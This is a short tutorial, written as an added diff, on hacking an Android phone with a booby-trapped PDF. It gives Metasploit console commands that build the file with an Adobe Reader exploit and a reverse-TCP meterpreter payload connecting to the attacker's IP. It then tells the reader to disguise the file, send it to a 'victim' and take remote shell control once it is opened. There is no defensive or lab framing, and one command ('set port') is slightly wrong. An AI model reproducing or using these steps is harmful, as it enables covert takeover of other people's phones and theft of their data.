@@ -1,0 +1,26 @@
+Step 1: Start your Kali Linux machine and open Metasploit console to start hacking android with a pdf file.
+
+Step 2: Make the malicious pdf file with the adobe reader exploit
+
+To make a malicious pdf file type the following commands in msf console:
+
+use exploit/android/fileformat/adobe_reader_pdf_js_interface
+
+set payload android/meterpreter/reverse_tcp
+
+set lhost 000.000.000.000 (your IP here)
+
+set port 20068
+
+exploit
+
+
+Step 3: Hack the android device with pdf file
+Now malicious pdf is ready. You can send this to victim. You can use pdf editor to edit the pdf and make it more realistic.
+
+The folder path is: /root/.msf4/local/pdf_name.pdf
+
+
+Once the victim opens the malicious pdf file, the android phone will be hacked, and we will get shell access on out kali machine, and you can control it remotely with meterpreter shell.
+
+Note : Connectivity is for limited period of time.
